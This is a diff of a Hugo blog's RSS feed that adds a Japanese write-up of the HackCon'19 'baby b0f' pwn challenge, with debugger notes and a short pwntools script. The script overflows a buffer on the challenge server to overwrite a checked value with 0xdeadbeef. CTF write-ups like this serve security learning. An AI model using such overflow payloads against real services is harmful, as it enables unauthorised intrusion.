@@ -7,30 +7,32 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>© Copyright 2016 John Doe</copyright>
-    <lastBuildDate>Fri, 14 Feb 2020 23:11:29 +0900</lastBuildDate>
+    <lastBuildDate>Fri, 14 Feb 2020 23:57:33 +0900</lastBuildDate>
     
 	<atom:link href="https://kuzushiki.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
-      <title>Creating a New Theme</title>
-      <link>https://kuzushiki.github.io/post/creating-a-new-theme/</link>
-      <pubDate>Sun, 28 Sep 2014 00:00:00 +0000</pubDate>
+      <title>HackCon&#39;19 write up</title>
+      <link>https://kuzushiki.github.io/post/hackcon2019/</link>
+      <pubDate>Fri, 14 Feb 2020 23:57:33 +0900</pubDate>
       
-      <guid>https://kuzushiki.github.io/post/creating-a-new-theme/</guid>
-      <description>Introduction This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&amp;rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&amp;rsquo;t cover using CSS to style your theme.
-We&amp;rsquo;ll start with creating a new site with a very basic template.</description>
-    </item>
-    
-    <item>
-      <title>Migrate to Hugo from Jekyll</title>
-      <link>https://kuzushiki.github.io/post/migrate-from-jekyll/</link>
-      <pubDate>Mon, 10 Mar 2014 00:00:00 +0000</pubDate>
-      
-      <guid>https://kuzushiki.github.io/post/migrate-from-jekyll/</guid>
-      <description>Move static content to static Jekyll has a rule that any directory not starting with _ will be copied as-is to the _site output. Hugo keeps all static content under static. You should therefore move it all there. With Jekyll, something that looked like
-▾ &amp;lt;root&amp;gt;/ ▾ images/ logo.png  should become
-▾ &amp;lt;root&amp;gt;/ ▾ static/ ▾ images/ logo.png  Additionally, you&amp;rsquo;ll want any files that should reside at the root (such as CNAME) to be moved to static.</description>
+      <guid>https://kuzushiki.github.io/post/hackcon2019/</guid>
+      <description>HackCon&amp;rsquo;19に参加しました！ (team:score_gazer)
+結果は705点で112位でした
+baby b0f (Pwn 100 pt) ポイント  バッファオーバーフロー（以下BOF）  解く プログラムを実行するといきなり入力を求められる
+ 間違った入力をするとTry Againと表示される  デバッガで逆アセンブルしつつ実行
+どうやらこの比較命令が怪しい
+RIP: 0x400760 (&amp;lt;main+153&amp;gt;:	cmp DWORD PTR [rbp-0x4],0xdeadbeef) BOFしてここを一致させることを考える
+以下のコマンドでrsp,rbpを表示
+x/32xw $rsp x/32xw $rbp 以下の行に注目
+0x7fffffffdeb0:	0x4141dfa0	0x000a4141	0x00000000	0xcafebabe 今回はAAAAと入力したが，その入力値が確認できる(Aは0x41に相当)
+さらに，0xcafebabeは[rbp-0x4]であることも分かる
+つまり，0xcafebabeの部分を0xdeadbeefにできれば良い
+ペイロードを作ってサーバに投げるプログラムを作って実行
+from pwn import * import socket con = remote(&amp;#39;68.183.158.95&amp;#39;, 8989) payload = b&amp;#39;A&amp;#39; * 10 payload += b&amp;#39;\xef\xbe\xad\xde&amp;#39; con.sendline(payload) con.interactive() フラグゲット
+補足   実は初めて解いたPwn問だったりする
+  Pwntoolsを使用してます</description>
     </item>
     
     <item>
@@ -54,30 +56,6 @@ Junior Resumé Maker, 2006 - 2007
  Intermingled presentation and content Styling was a pain, so either didn&amp;rsquo;t do it or found a half-decent template and didn&amp;rsquo;t mess with it    \LaTeX\ + pdflatex
 Senior Resumé Maker, 2008 - 2010
  Edited verbose \LaTeX\ documents in a text editor Mixed content and presentation to achieve pixel-perfection Installed and configured the unusual TeX setups required by the best-looking \LaTeX\ resumés    LinkedIn, StackOverflow Careers, vizualize.</description>
-    </item>
-    
-    <item>
-      <title>(Hu)go Template Primer</title>
-      <link>https://kuzushiki.github.io/post/goisforlovers/</link>
-      <pubDate>Wed, 02 Apr 2014 00:00:00 +0000</pubDate>
-      
-      <guid>https://kuzushiki.github.io/post/goisforlovers/</guid>
-      <description>Hugo uses the excellent go html/template library for its template engine. It is an extremely lightweight engine that provides a very small amount of logic. In our experience that it is just the right amount of logic to be able to create a good static website. If you have used other template systems from different languages or frameworks you will find a lot of similarities in go templates.
-This document is a brief primer on using go templates.</description>
-    </item>
-    
-    <item>
-      <title>Getting Started with Hugo</title>
-      <link>https://kuzushiki.github.io/post/hugoisforlovers/</link>
-      <pubDate>Wed, 02 Apr 2014 00:00:00 +0000</pubDate>
-      
-      <guid>https://kuzushiki.github.io/post/hugoisforlovers/</guid>
-      <description>Step 1. Install Hugo Goto hugo releases and download the appropriate version for your os and architecture.
-Save it somewhere specific as we will be using it in the next step.
-More complete instructions are available at installing hugo
-Step 2. Build the Docs Hugo has its own example site which happens to also be the documentation site you are reading right now.
-Follow the following steps:
- Clone the hugo repository Go into the repo Run hugo in server mode and build the docs Open your browser to http://localhost:1313  Corresponding pseudo commands:</description>
     </item>
     
   </channel>
